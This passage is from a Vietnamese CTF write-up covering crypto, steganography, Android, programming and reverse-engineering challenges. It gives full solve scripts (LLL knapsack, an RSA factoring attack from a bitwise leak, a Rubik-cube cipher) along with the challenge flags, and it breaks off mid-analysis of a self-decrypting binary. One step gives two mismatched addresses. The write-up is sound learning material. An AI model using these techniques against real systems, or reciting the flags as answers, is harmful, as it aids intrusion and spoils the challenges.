- Với plus_func: tương tự như trên nhưng mình trừ nó thay vì nhân với inverse.

Script solve:
```python
from Crypto.Util.number import inverse, long_to_bytes
# from sympy.ntheory import discrete_log
from sage.all import *
c = [752589857254588976778, 854606763225554935934, 102518422244000685572, 779286449062901931327, 424602910997772742508, 1194307203769437983433,
     501056821915021871618, 691835640758326884371, 778501969928317687301, 1260460302610253211574, 833211399330573153864, 223847974292916916557]
p = 1341161101353773850779
e = 2

def rev_plus_func(data,shift):
	return (data-shift) % (0xffffffff + 1)

def rev_mul_func(data,mul):
	return (data * inverse(mul, 0xffffffff + 1)) % (0xffffffff + 1)

def rev_pow_func(data,e,p):
    return mod(data, p).sqrt(all=True)
	# return modular_sqrt(data, p)

def rev_exp_func(data,base,p):
  R = IntegerModRing(p)
  x = discrete_log(R(data), R(base))
  return x

flag = b''
for ci in c:
  for n0 in rev_pow_func(ci, e, p):
    n1 = rev_exp_func(n0, e, p)
    
    # reverse xor_shift_right_func
    if n1 > 0xffffffff:
      continue
    l = 0xffffffff.bit_length()

    new = [(n1 >> l - 1) & 1] + [None] * (l - 1)
    for i in range(l - 1, 0, -1):
        b = new[l - 1 - i]

        b2 = (n1 >> (i - 1)) & 1
        new[l - i] = b2 ^ b

    n2 = int(''.join([str(i) for i in new]), 2)
    n3 = rev_mul_func(n2, 2898124289)
    n4 = rev_plus_func(n3, 3442055609)

    flag += long_to_bytes(n4)[::-1]

print(flag)

```
#### Flag
`CHH{w3lc0m3_70_7h3_m47h_w0rld(1_h4t3_1t_th3r3)}`

### Knapsack Ls
**Difficulty:** <span style="color: orange">Medium</span>
#### Cách giải
Ý tưởng là sử dụng thuật toán LLL để giải bài toán 0/1 knapsack 
Các tài liệu giải thích: [Knapsack Cipher](https://ctf-wiki.mahaloz.re/crypto/asymmetric/knapsack/knapsack/) và [paper](https://eprint.iacr.org/2009/537.pdf) này
Mục tiêu là tạo ma trận như sau

![](https://hackmd.io/_uploads/BktFMUFF2.png)

rồi áp dụng dụng thuật toán LLL lên nó.

Script solve:
```python
from Crypto.Util.number import long_to_bytes
from sage.all import *

a = [43840113305581131795279797789093610869, 25671162443490210031784763050767207532, 6001769265119430614631782649952643356, 73521673497713025029239337461919881111, 86207439010568594314162414481970962317, 47714522703176373455115652188956101728, 39013785450660799339071487833855117053, 99720328779553130323261570624699472274, 56801730014082032103764648702913670605, 56875947939072280053341910569703290481, 6777018736332231356360273109122323983, 64282820255623342830695520268826453473, 21510177863483107761513368858017158458, 88999212996376205373411604716481814294, 21167180433710172715561410769658980338, 53988354426206626048276676648717671789,
     82454574554107632872906561271793885103, 34238518652709304551635369779340095136, 5081213770246109310854315030563596017, 35676546839591659980876620994236683080, 61804490028276149551813742275879895343, 47868484398459384397990013507113194128, 79141732458875716511767486956076635010, 89768484644472604982812438158836379513, 108665660470366488973920414914088436457, 42013527007997056247679460159005166736, 59516238668397055079712758172437350204, 12247246885302547631808898114678421540, 68119702452821826703846268698978422087, 46477361269068664125259653428529967798, 104192935540102711457274510496328770849, 39480897318804270587289396967546023715]
s = b'\xe7\x81W\x8eA0\xb0\x92tM\xc9\x06\x07~$\xef\x01\x0c\x16\x8cP\x11l\x81\xe8\xa7\xa3\x0e\xec\x8a~\xe9Z\x02\xb28\x92z^\x16m\xb5\x80o\xf6\xd9\xec@\xc0\x85\x02\xdbvo\x8bB\xb3\xa2\xe4\x00\x01\xc2\xcaL\xdb\x8a\t\x03\xaf\xa528\xc8\xa1\xf6\x05u\xeb\xc0\xcbc\x06\xd8 \x02\xca@E&\xf0d4A\x85\x04\x84p~\xa5\t\xfe\x02\xd9\xa8\xcbp\xb9\xe8\x14\x04\x9a\xb9\x16#\x0b\xb8\x98\x90\x02\x8c\xe2\xf1\x8a\xf1\xe3Z\xe4\xff\xb4"\xeb\x86k\x97\x1b\x02IsN%\xd5\xect\x96\xb3\xe7\xf5Mw\xe6S\xbd\x02\xb7\xc4\xe9\xa6\x019q\xc9\xdd\xaf\xad9bG\xd8\x1e\x02\x18{\xc6q\xbe=\x97&\x18qj\xed\xfd\xb8\x94\xfd\x01'

block_size = 32
block = [s[i * 17: (i + 1) * 17] for i in range(0, 11)]
block = [int.from_bytes(b, 'little') for b in block]

flag = b''
for s in block:
  n = len(a)
  N = ceil(sqrt(n) / 2)

  b = []
  for i in range(n):
      vec = [0 for _ in range(n + 1)]
      vec[i] = 1
      vec[-1] = N * a[i]
      b.append(vec)

  b.append([1 / 2 for _ in range(n)] + [N * s])

  BB = matrix(QQ, b)
  l_sol = BB.LLL()
  # print(l_sol)
  for e in l_sol:
      if e[-1] == 0:
          msg = 0
          isValidMsg = True
          for i in range(len(e) - 1):
              ei = 1 - (e[i] + (1 / 2))
              if ei != 1 and ei != 0:
                  isValidMsg = False
                  break

              msg |= int(ei) << i

          if isValidMsg:
              print('[*] Got:', long_to_bytes(msg)[::-1])
              flag += long_to_bytes(msg)[::-1]
              break

print("Final flag: ", flag)
```
#### Flag
`CHH{kn4p54ck_15_br0k3n_th3r3f0r3_e4sy!!!}`

### Rubic Cipher
**Difficulty:** <span style="color: red">Hard</span>

Challenge gồm có 3 file:
`rubik.txt`
```

         | 0  1  2  |
         | 3  4  5  |
         | 6  7  8  |

9  10 11 | 12 13 14 | 15 16 17 | 18 19 20 
21 22 23 | 24 25 26 | 27 28 29 | 30 31 32
33 34 35 | 36 37 38 | 39 40 41 | 42 43 44
		     
           45 46 47 
           48 49 50
           51 52 53		 
```
`scramble_sequence.txt`
```
(F, AAAAAAAAABBBCCCDDDEEEBBBCCCDDDEEEBBBCCCDDDEEEFFFFFFFFF) = AAAAAABBBBBFCCCADDEEEBBFCCCADDEEEBBFCCCADDEEEDDDFFFFFF

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

IV = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuv"
KEY="D R2 F2 D B2 D2 R2 B2 D L2 D' R D B L2 B' L' R' B' F2 R2 D R2 B2 R2 D L2 D2 F2 R2 F' D' B2 D' B U B' L R' D'"

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
```
Và `cipher.txt`
```
b';V".24$9\x0cw`\x02 \x16\x0b9j:2F\x128-x?\x05C\x1b3$\nShX*W\x01,\x025\x01\x0e\x17\x17\x01\x1c>X\x02C=\x00<\x1a0\x18>\x06\x00JE\x1e\x00\x16X\x0b \x0c\x1d\x08\r9\x0b0\x12q\x1fRS7\x0f3\x01tfa)\x07\x0ee3\n(<\x163j\x0b0.Z%%q8j$2'
```

Nhìn sơ qua các file có thể đoán được tác giả đang muốn mình giải cipher bằng cách áp các kí tự vào thứ tự tương ứng trong `rubik.txt` và xoay cục rubik theo trình tự trong `KEY`

Bước đầu tiên trong quá trình giải thì phải cần cài đặt (mô phỏng) lại cách xoay cục rubik trong python. Và để làm như thế thì có vẻ mất rất nhiều thời gian nên mình tìm thử trên mạng xem có ai đã làm giùm chưa.

Thì vô tình mình tìm được một [challenge](https://dunsp4rce.github.io/rgbCTF-2020/cryptography/2020/07/14/RubikCBC.html) của CTF khác cũng khá giống với bài này và trong đó có hàm `scramble` mà mình cần tìm.

Cuối cùng thì ghép các thứ lại với nhau thui. Sau khi xoay rubik xong thì cần làm thêm 1 bước giống trong AES-CBC để lấy được flag.

Script solve:
```python
def scramble(move, cube):
  rounds = 1
  if len(move) > 1:
    if move[1] == '\'':
      rounds = 3
    elif move[1] == '2':
      rounds = 2
  U = [20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9]
  U1 = [0, 1, 2, 5, 8, 7, 6, 3]
  D = [33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44]
  D1 = [45, 46, 47, 50, 53, 52, 51, 48]
  L = [0, 3, 6, 12, 24, 36, 45, 48, 51, 44, 32, 20]
  L1 = [9, 10, 11, 23, 35, 34, 33, 21]
  R = [53, 50, 47, 38, 26, 14, 8, 5, 2, 18, 30, 42]
  R1 = [15, 16, 17, 29, 41, 40, 39, 27]
  F = [6, 7, 8, 15, 27, 39, 47, 46, 45, 35, 23, 11]
  F1 = [12, 13, 14, 26, 38, 37, 36, 24]
  B = [2, 1, 0, 9, 21, 33, 51, 52, 53, 41, 29, 17]
  B1 = [18, 19, 20, 32, 44, 43, 42, 30]
  if move[0] == 'U':
    old = U
    old1 = U1
  elif move[0] == 'D':
    old = D
    old1 = D1
  elif move[0] == 'L':
    old = L
    old1 = L1
  elif move[0] == 'R':
    old = R
    old1 = R1
  elif move[0] == 'F':
    old = F
    old1 = F1
  elif move[0] == 'B':
    old = B
    old1 = B1
  else:
    return

  new = old[-rounds * 3:] + old[:-rounds * 3]
  new1 = old1[-rounds * 2:] + old1[:-rounds * 2]
  new = [cube[i] for i in new]
  new1 = [cube[i] for i in new1]
  cube = list(cube)
  for i, c in zip(old, new):
    cube[i] = c
  for i, c in zip(old1, new1):
    cube[i] = c

  return bytes(cube)

cipher = b';V".24$9\x0cw`\x02 \x16\x0b9j:2F\x128-x?\x05C\x1b3$\nShX*W\x01,\x025\x01\x0e\x17\x17\x01\x1c>X\x02C=\x00<\x1a0\x18>\x06\x00JE\x1e\x00\x16X\x0b \x0c\x1d\x08\r9\x0b0\x12q\x1fRS7\x0f3\x01tfa)\x07\x0ee3\n(<\x163j\x0b0.Z%%q8j$2'
IV = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuv"
turns = "D R2 F2 D B2 D2 R2 B2 D L2 D' R D B L2 B' L' R' B' F2 R2 D R2 B2 R2 D L2 D2 F2 R2 F' D' B2 D' B U B' L R' D'"

cubes = [cipher[54 * i : 54 * (i + 1)] for i in range(len(cipher) // 54)]

out = b""
for cube in cubes:
  next_IV = cube
  for t in turns.split(" "):
    cube = scramble(t, cube)

  out += bytes([_a ^ _b for _a, _b in zip(cube, IV)])
  IV = next_IV

print(out)
```
#### Flag
`CHH{wh0_kn3w_rub1k_puzzl3_c4n_b3_u53d_f0r_3ncryp710n_t00?}`
### RSA Percent Leak
**Difficulty:** <span style="color: maroon">Insane</span>
#### Cách giải
Script đề bài:
```python
from Crypto.Util.number import *
from secret import flag
 
if __name__ == '__main__':
    p = getPrime(1024)
    q = getPrime(1024)
    n = p*q
    l = (p & q) * (p ^ q) | 0x1337
    c = pow(bytes_to_long(flag), 65537, n)
 
    print(f'n = {hex(n)}\n')
    # n = 0xa7643b16219097b5cc47af0acfbb208b2717aa2c2dbdbd37a3e6f6f40ae12b77e8d129eb672d660b6e146682a32d70c01f8e481b90b5ec710dabb57e8de2661fd49ec9d3a23d159bd5fb397047a1e053bbbf579d996e7fe7af56332753b816f4a5353966bfe50b7e0d95d9f235f5edfd59e23d3a7523cd25ea6e34a6f16f2d14b21c43f3bb7b68a8b2237a77fb6cb4cf3ba3987c478a39391b0f42a0d0230846a054599fea4effe27fcd9b514f711831b38f0288db256deef967f3d3d20b9e0071027b99cae1b0a3bd452efd654d1a4a431291ba8a99743d44a35afcb1db267a8c63574ac1ef32c8e71de473cc98aea927e3de0daf5819600818edac66b74b9b
    print(f'l = {hex(l)}\n')
    # l = 0x168b7f77f276e7f9f55df25d096cd5abbf632f22eae79ba72bad2d60ebccb03c6b614be2c682d58655a335277afa171fb085b40519311be7e74d26d37a066d9487ce511ad72e54779225534ca37c2714e51aca763676590dc2fb1e70c66dc8113704e168d46ab91fd8cdc77738314be6e1b20fc5664b747dddc94ff17f2fc7c80e75bcdc1c3618c54144070f13e698b31ff3d601559a1dafb62904c1079d7ba69ec5d024068dd3b2e6c2d71e4a81589734a5c6e4d4a05335edaf42e9aacf339f930ffb909fa100398eff29a61cb2e58eeff756b5a7b101d69f1e11fa989431bc175e0d59264da400f2d63dfaf1b2ba27ee9698a6a9a83bfe57aab0c069089fff
    print(f'c = {hex(c)}\n')
    # c = 0x56b894058c86db8641f2586a94794662520de144dbfbd0d3ad36a50b81b6d70a6a1d6f3e7faf2b37b1c53127e5684d235191664741ff2f0516c3d7596f3995abdd16a171be43f5660c9d4620db64f2430ae8c314f5576d912aae2e643517466b3fb409b4589b4726f12f3c376de45960dafdb658279b232118e6a9b1383ef600cdef465c499d330776c89cc5e0d02ec97a0614bc1d557f4e53595772bf02310105fe0ff8e27ba0376500990e6e8b2eb318bfa20f46b62c8841e8f97e8b649a2b18e4d6dc1bc2184184288559f8e43043bbff6f27479aa7846dac4f1d9e62ee3167fe511a6606f4ff69fb61bb4d2610913bc85e57144b0fe58cfca8e8b2ba996e
```
Nhìn sơ qua thì thầy để khá ảo ma vì làm thế nào mà từ `l = (p & q) * (p ^ q) | 0x1337` mà phân tích ra p và q được.

Nhưng nếu để ý kĩ thì mấy phép toàn bitwise (&, ^, \|) không làm thay đổi độ dài bit của số và số l có dạng cũng giống như số n (số thứ nhất * số thứ hai).

Nên từ đó có thể suy ra rằng n bit cuối của l và n sẽ được tính toán dựa trên n bit cuối của p và q.

Vậy hướng giải đó chính là brute force n bit cuối của q và p sao cho nó bằng với n bit cuối của l và n. 

Script solve:
```python
from Crypto.Util.number import inverse, long_to_bytes as l2b
from itertools import product
from tqdm import tqdm
n = 0xa7643b16219097b5cc47af0acfbb208b2717aa2c2dbdbd37a3e6f6f40ae12b77e8d129eb672d660b6e146682a32d70c01f8e481b90b5ec710dabb57e8de2661fd49ec9d3a23d159bd5fb397047a1e053bbbf579d996e7fe7af56332753b816f4a5353966bfe50b7e0d95d9f235f5edfd59e23d3a7523cd25ea6e34a6f16f2d14b21c43f3bb7b68a8b2237a77fb6cb4cf3ba3987c478a39391b0f42a0d0230846a054599fea4effe27fcd9b514f711831b38f0288db256deef967f3d3d20b9e0071027b99cae1b0a3bd452efd654d1a4a431291ba8a99743d44a35afcb1db267a8c63574ac1ef32c8e71de473cc98aea927e3de0daf5819600818edac66b74b9b
c = 0x56b894058c86db8641f2586a94794662520de144dbfbd0d3ad36a50b81b6d70a6a1d6f3e7faf2b37b1c53127e5684d235191664741ff2f0516c3d7596f3995abdd16a171be43f5660c9d4620db64f2430ae8c314f5576d912aae2e643517466b3fb409b4589b4726f12f3c376de45960dafdb658279b232118e6a9b1383ef600cdef465c499d330776c89cc5e0d02ec97a0614bc1d557f4e53595772bf02310105fe0ff8e27ba0376500990e6e8b2eb318bfa20f46b62c8841e8f97e8b649a2b18e4d6dc1bc2184184288559f8e43043bbff6f27479aa7846dac4f1d9e62ee3167fe511a6606f4ff69fb61bb4d2610913bc85e57144b0fe58cfca8e8b2ba996e
l = 0x168b7f77f276e7f9f55df25d096cd5abbf632f22eae79ba72bad2d60ebccb03c6b614be2c682d58655a335277afa171fb085b40519311be7e74d26d37a066d9487ce511ad72e54779225534ca37c2714e51aca763676590dc2fb1e70c66dc8113704e168d46ab91fd8cdc77738314be6e1b20fc5664b747dddc94ff17f2fc7c80e75bcdc1c3618c54144070f13e698b31ff3d601559a1dafb62904c1079d7ba69ec5d024068dd3b2e6c2d71e4a81589734a5c6e4d4a05335edaf42e9aacf339f930ffb909fa100398eff29a61cb2e58eeff756b5a7b101d69f1e11fa989431bc175e0d59264da400f2d63dfaf1b2ba27ee9698a6a9a83bfe57aab0c069089fff

def hint(p, q):
    return (p & q) * (p ^ q) | 0x1337

def get_last_n_bit(num, nbit):
  return num & ((1 << nbit) - 1)

guess = []
for bp, bq in product(range(2), repeat=2):
  if hint(bp, bq) & 1 == l & 1 and (bp * bq) & 1 == n & 1:
    # Tìm bit cuối
    guess += [(bp, bq)]

nbit = 1
found = False
bar = tqdm(total=1024)
while not found:
  nbit += 1
  bar.update(1)

  next_guess = []
  for prev_p, prev_q in guess:
    for bp, bq in product(range(2), repeat=2):
      # Đoán bit tiếp theo
      next_p = prev_p + bp * (1 << nbit - 1)
      next_q = prev_q + bq * (1 << nbit - 1)
      guess_l = hint(next_p, next_q)

      if get_last_n_bit(guess_l, nbit) != get_last_n_bit(l, nbit):
        continue

      if get_last_n_bit(next_p * next_q, nbit) == get_last_n_bit(n, nbit):
        next_guess += [(next_p, next_q)]

  guess = next_guess

  for p, q in guess:
    if hint(p, q) == l and p * q == n:
      print("FOUND")
      print(f'{p = }')
      print(f'{q = }')
      found = (p, q)
      break

p, q = found
e = 65537
d = inverse(e, (p - 1) * (q - 1))
print("FLAG:", l2b(pow(c, d, n)))
bar.close()
```
#### Flag
`CHH{pl3453_pr0v1d3_4_d3t41ll3d_wr1t3up_b3c4us3_7h1s_k1nd_0f_a77ack_1s_r4th3r_r4r3}`

## Steganography
### CutieK1tty
**Difficulty:** <span style="color: orange">Medium</span>
#### Cách giải
Đề cho file `cut3_c4t.png`, thử lệnh `binwalk` thì thấy trong file có chứ thêm file .rar
```bash
binwalk -e cut3_c4t.png
```
![](https://hackmd.io/_uploads/rk7OYcKYh.png)
Extract nó ra và giải nén file.rar thì có thêm file `purrr_2.mp3` với 1 file `y0u_4r3_cl0s3.rar`

Mở file .rar lên nhưng nó lại bị lỗi, check header thử thì thấy header của nó bị sai.
![](https://hackmd.io/_uploads/ryM7o5tFh.png)

Header file .rar phải là `Rar!` mới đúng chứ không phải `Cat!`
Sửa lại header rồi mở lên thì thấy phải nhập password mớ cho lấy flag.
![](https://hackmd.io/_uploads/Hy5jj9tY3.png)

Bây giờ thì phải tìm password, thấy là còn 1 file chưa đụng tới đó là `purrr_2.mp3`

Mở nó lên bằng [Sonic Visualiser](https://www.sonicvisualiser.org/), thêm spectrogram layer vô thì thấy được mật khẩu
![](https://hackmd.io/_uploads/BJ7kp9ttn.png)

Nhập mật khẩu và lấy flag thui :v 

![](https://hackmd.io/_uploads/rk2HpqKK2.png)

#### Flag
`CHH{f0r3n51cs_ma5t3r}`

## Mobile 
### Cat Me
**Difficulty:** <span style="color: lime">Very Easy</span>
#### Cách giải
Mở ứng dụng trong điện thoại thì chỉ có nền đen và dòng chữ `Cookie Warrior`.

Decompile apk bằng [Bytecode Viewer](https://github.com/Konloch/bytecode-viewer) rồi search thử string `Cookie Warrior` để tìm xem nó nằm ở đâu
![](https://hackmd.io/_uploads/SyM9nKtFn.png)
Thì thấy ngay ở phía dưới có 1 đoạn string nhìn khá giống base64.

Ghép nó lại đem lên [cyberchef](https://gchq.github.io/CyberChef/) để decode là ra flag
#### Flag
`CHH{M0re_1n7ER3STIN9_7h1N6_1N_logcat}`

### Pinned Cookie
**Difficulty:** <span style="color: green">Easy</span>
#### Cách giải
Mở app trên điện thoại thì thấy 1 cái form login, nhưng mình không biết username với password.

Tương tự như bài trên, mình tìm thử chuỗi `login` trong [Bytecode Viewer](https://github.com/Konloch/bytecode-viewer)
![](https://hackmd.io/_uploads/BJ6DMcKYh.png)

Ở dưới cũng có 1 mảng chứa các chuỗi giống như base64. Mình ghép nó lại đem đi decode thì lại không ra.

Kéo xuống dưới nữa thì mình thấy có hàm này
![](https://hackmd.io/_uploads/ryA575YF3.png)
Sau một hồi phân tích thì chức năng của hàm này đó chính là lấy cái chuỗi base64 trên, decode nó, rồi đem xor với mật khẩu của admin, đó là `sTroN6PaSswORD`

#### Flag
`CHH{yoU_c4N_bYP45S_sSL_PInninG}`
## Programming
### Identity Security
**Difficulty:** <span style="color: green">Easy</span>
![](https://hackmd.io/_uploads/HkW96sYKn.png)

Đề bài cũng khá self-explanatory nên mình chỉ để script solve ở đây
#### Cách giải
```python
n = int(input())

for i in range(n):
  inp = input().strip()
  if '@' in inp:
    username, domain = inp.split('@')
    if len(username) > 7:
      out = username[:2] + '*' * (len(username) - 5) + username[-3:]
    else:
      out = username[:1] + '*' * (len(username) - 2) + username[-1:]
    out += '@' + domain
  else:
    out = inp[:2] + '*' * (len(inp) - 5) + inp[-3:]

  print(out)

```
#### Flag
`CHH{1DeNt17Y_SecuriTy_f200ddc95a3538f6724ef69715896aa8}
`

### Decrypt
**Difficulty:** <span style="color: orange">Medium</span>

![](https://hackmd.io/_uploads/H196_rOFn.png)

Đề bài cũng khá self-explanatory nên mình chỉ để script solve ở đây
#### Cách giải
```python
import math

def divisorGenerator(n):
  large_divisors = []
  for i in range(1, int(math.sqrt(n) + 1)):
    if n % i == 0:
      yield i
      if i*i != n:
        large_divisors.append(n / i)
  for divisor in reversed(large_divisors):
    yield int(divisor)

n = int(input())
c = input()

def decrypt(n, c):
  for i in divisorGenerator(n):
    c = c[:i][::-1] + c[i:]
  return c

print(decrypt(n, c))

```
#### Flag
`CHH{pro9R4mmINg_D3CRYPT_c0581467a10203a5512144ea9a63c54c}
`

## Reverse Engineering
### pyreverse
**Difficulty:** <span style="color: lime">Very Easy</span>

#### Cách giải
exe của bài được viết bởi python -> dễ reverse ra source code
Sử dụng [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) để extract file
-> Có được các file .pyc
Sử dụng [uncompyle6](https://github.com/rocky/python-uncompyle6) để decompile nhưng fail vì file được viết bằng python 3.10 (hiện tại chưa có tool decompile :(( )

-> Đọc `pyreverser.pyc` bằng HxD thì thấy
`Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==`
-> base64 decode ra flag
#### Flag
`CHH{python2Exi_Reverse_ENginering}`

### Jump
**Difficulty:** <span style="color: green">Easy</span>

Reverse jump.exe bằng IDA thì thấy app lấy input của người dùng và nhảy tớ địa chỉ mà người dùng nhập để chạy tiếp.
Chạy gdb để tìm địa chỉ của các hàm

![](https://hackmd.io/_uploads/HyiNqB_Kn.png)
`0x00401500 = 4199680`

Nhập vào 419960 thì ra flag

![](https://hackmd.io/_uploads/rk8_9r_Yn.png)

#### Flag
`CHH{JUMP_T0_TH3_M00N}`

### Rev1
**Difficulty:** <span style="color: orange">Medium</span>

#### Cách giải
Kiểm tra thông tin file với Detect it easy:
![](https://hackmd.io/_uploads/ByukcoYF2.png)

Như vậy file được cho là ở dạng 32bit, không bị pack

Mở file bằng IDA, ta được như sau:

![](https://hackmd.io/_uploads/r1Tu9jKFn.png)

Hàm `DialogFunc`:

```c
HGDIOBJ __stdcall DialogFunc(HWND hWnd, UINT a2, HDC a3, LPARAM a4)
{
  HGDIOBJ result; // eax
  HMODULE ModuleHandleA; // eax
  HMODULE v6; // eax
  HMENU SystemMenu; // eax
  HMENU v8; // eax
  HWND DlgItem; // eax
  LONG WindowLongA; // eax
  HRSRC v11; // [esp-4h] [ebp-168h]
  DWORD ThreadId; // [esp+0h] [ebp-164h] BYREF
  int X; // [esp+4h] [ebp-160h]
  int Y; // [esp+8h] [ebp-15Ch]
  int nWidth; // [esp+Ch] [ebp-158h]
  int nHeight; // [esp+10h] [ebp-154h]
  HDC hDC; // [esp+14h] [ebp-150h]
  unsigned int v18; // [esp+18h] [ebp-14Ch]
  struct tagPAINTSTRUCT Paint; // [esp+1Ch] [ebp-148h] BYREF
  CHAR String[260]; // [esp+5Ch] [ebp-108h] BYREF

  memset(String, 0, sizeof(String));
  hwnd = hWnd;
  v18 = a2;
  if ( a2 > 0x133 )
  {
    switch ( v18 )
    {
      case 0x136u:
        result = h;
        break;
      case 0x138u:
        goto LABEL_20;
      case 0x200u:
        if ( dword_414300 == 1 )
        {
          GetWindowRect(hWnd, &Rect);
          GetCursorPos(&stru_414380);
          X = Rect.left + stru_414380.x - Point.x;
          Y = Rect.top + stru_414380.y - Point.y;
          nWidth = Rect.right - Rect.left;
          nHeight = Rect.bottom - Rect.top;
          Point = stru_414380;
          MoveWindow(hWnd, X, Y, Rect.right - Rect.left, Rect.bottom - Rect.top, 1);
        }
        return 0;
      case 0x201u:
        dword_414300 = 1;
        SetCapture(hWnd);
        GetCursorPos(&Point);
        return 0;
      case 0x202u:
        dword_414300 = 0;
        ReleaseCapture();
        return 0;
      default:
        return 0;
    }
  }
  else if ( v18 == 307 )
  {
LABEL_20:
    SetBkColor(a3, 1u);
    SetTextColor(a3, 0x2DFFFFu);
    return h;
  }
  else
  {
    if ( v18 > 0x2B )
    {
      if ( v18 == 272 )
      {
        dword_414448 = sub_401E10((LPCSTR)0x3F8, (LPCSTR)0x3F7);
        ModuleHandleA = GetModuleHandleA(0);
        hResData = FindResourceA(ModuleHandleA, (LPCSTR)0x3F8, (LPCSTR)0x3F7);
        v11 = hResData;
        v6 = GetModuleHandleA(0);
        dword_4143A0 = SizeofResource(v6, v11);
        FreeResource(hResData);
        SetDlgItemTextA(hWnd, 1004, ::String);
        SendMessageA(hWnd, 0x80u, 1u, hIcon);
        dword_4142FC = sub_401E10((LPCSTR)0x3F6, (LPCSTR)0x3F5);
        dword_4143A4 = GetDlgItem(hWnd, 1003);
        dword_4143D8 = GetDlgItem(hWnd, 1001);
        dword_41438C = GetDlgItem(hWnd, 1002);
        dword_414370 = GetDlgItem(hWnd, 1007);
        GetClientRect(hWnd, &x);
        ++x.top;
        ++x.left;
        --x.bottom;
        x.right -= 2;
        dword_414398 = GetDlgItem(hWnd, 1004);
        ::hWnd = GetDlgItem(hWnd, 1005);
        GetClientRect(::hWnd, &rc);
        SetLayeredWindowAttributes(hWnd, 0, 0xCCu, 2u);
        --rc.top;
        --rc.left;
        ++rc.right;
        ++rc.bottom;
        SystemMenu = GetSystemMenu(hWnd, 0);
        DeleteMenu(SystemMenu, 2u, 0x400u);
        v8 = GetSystemMenu(hWnd, 0);
        DeleteMenu(v8, 3u, 0x400u);
        EnableWindow(dword_4143A4, 0);
        EnableWindow(dword_4143D8, 0);
        EnableWindow(dword_41438C, 0);
        DlgItem = GetDlgItem(hWnd, 1005);
        SetFocus(DlgItem);
        WindowLongA = GetWindowLongA(hWnd, -20);
        SetWindowLongA(hWnd, -20, WindowLongA | 0x80000);
        SetLayeredWindowAttributes(hWnd, 0xFFu, 0, 3u);
        ShowWindow(hWnd, 5);
        SetTimer(hWnd, 0xDEu, 0x28u, TimerFunc);
      }
      else if ( v18 == 273 )
      {
        if ( a3 == (HDC)1001 )
        {
          SendMessageA(hWnd, 0x10u, 0, 0);
        }
        else if ( a3 == (HDC)1003 )
        {
          GetDlgItemTextA(hWnd, 1005, String, 260);
          if ( sub_402030(String) )
          {
            if ( dword_4142F8 )
            {
              sub_401F90(dword_414370);
              DeleteObject(ho);
              dword_4142F8 = 0;
            }
          }
          else if ( !dword_4142F8 )
          {
            sub_401EC0(dword_4142FC);
            dword_4142F8 = 1;
          }
        }
      }
    }
    else
    {
      switch ( v18 )
      {
        case 0x2Bu:
          sub_401B80(hWnd, a4);
          break;
        case 2u:
          TerminateThread(hThread, 0);
          sub_4011FB(&dword_414400);
          DeleteObject(h);
          DeleteObject(hbr);
          DeleteObject(lParam);
          DestroyIcon((HICON)hIcon);
          PostQuitMessage(0);
          break;
        case 0xFu:
          dword_414450 = (int)hWnd;
          dword_414454 = (int)asc_413880;
          hDC = BeginPaint(hWnd, &Paint);
          FrameRect(hDC, &x, (HBRUSH)hbr);
          SelectObject(hDC, hbr);
          MoveToEx(hDC, x.left, 20, 0);
          LineTo(hDC, x.right, 20);
          SetBkMode(hDC, 1);
          SetTextColor(hDC, 0x2DFFFFu);
          SelectObject(hDC, dword_414374);
          hThread = CreateThread(0, 0, StartAddress, &dword_414450, 0, &ThreadId);
          EndPaint(hWnd, &Paint);
          hDC = GetDC(dword_414398);
          FrameRect(hDC, &rc, (HBRUSH)hbr);
          ReleaseDC(dword_414398, hDC);
          hDC = GetDC(::hWnd);
          FrameRect(hDC, &rc, (HBRUSH)hbr);
          ReleaseDC(::hWnd, hDC);
          break;
        case 0x10u:
          EndDialog(hWnd, 0);
          break;
      }
    }
    return 0;
  }
  return result;
}
```

Để biết chức năng của message, ta sẽ mở thử chương trình (Do Defender cảnh báo là virus nên sẽ chạy bên trong máy ảo), giao diện như sau:

![](https://hackmd.io/_uploads/HJvJiiFt3.png)

![](https://hackmd.io/_uploads/By3JooYYn.png)

Như vậy mục tiêu của chương trình sẽ là tìm ra đoạn `password` thích hợp để khi ấn vào `check`, không hiện WRONG.

Quay trở lại với đoạn code handle message ở trên, để có thể kiểm tra được string, cần phải có hàm để đọc string -> focus vào đoạn sau:

```c
// ...
        else if ( a3 == (HDC)1003 )
        {
          GetDlgItemTextA(hWnd, 1005, String, 260);
          if ( sub_402030(String) )
          {
            if ( dword_4142F8 )
            {
              sub_401F90(dword_414370);
              DeleteObject(ho);
              dword_4142F8 = 0;
            }
          }
          else if ( !dword_4142F8 )
          {
            sub_401EC0(dword_4142FC);
            dword_4142F8 = 1;
          }
        }
// ...
```

Kiểm tra hàm `sub_402030`:
```c
int __cdecl sub_402030(const char *a1)
{
  signed int v1; // kr00_4
  int v3; // [esp+10h] [ebp-14h]
  unsigned int v4; // [esp+1Ch] [ebp-8h]

  v4 = 0;
  dword_4143C0 = (int)dword_414448;
  v3 = dword_414448();
  if ( v3 )
  {
    v1 = strlen(a1);
    dword_4143A0 -= (int)dword_414448 - dword_4143C0;
    while ( v4 < dword_4143A0 )
    {
      *((_BYTE *)dword_414448 + v4) ^= a1[(int)v4 % v1];
      ++v4;
    }
  }
  return v3;
}
```
Ở đây biến `dword_414448` không được khởi tạo sẵn -> cần phải debug. Thực hiện debug remote bằng ida:
![](https://hackmd.io/_uploads/H1nDjjtK3.png)

Sau khi step into, sẽ dẫn tới một vùng nhớ mới chứa code như sau:

![](https://hackmd.io/_uploads/ry8uojKYn.png)

Có thể chương trình thực hiện tự mã hóa code và thực hiện giải mã khi chạy -> đoạn code này sẽ không thể tìm ở bất cứ đâu trong chương trình.

Các thao tác được lặp đi lặp lại -> có thể là đang kiểm tra từng phần tử của mảng, thực hiện create function ở `0x2e50000` và disassemble ta được:

```c
int __usercall sub_2E50000@<eax>(unsigned __int8 *a1@<edi>)
{
  unsigned int v1; // kr04_4
  int retaddr; // [esp+4h] [ebp+0h]

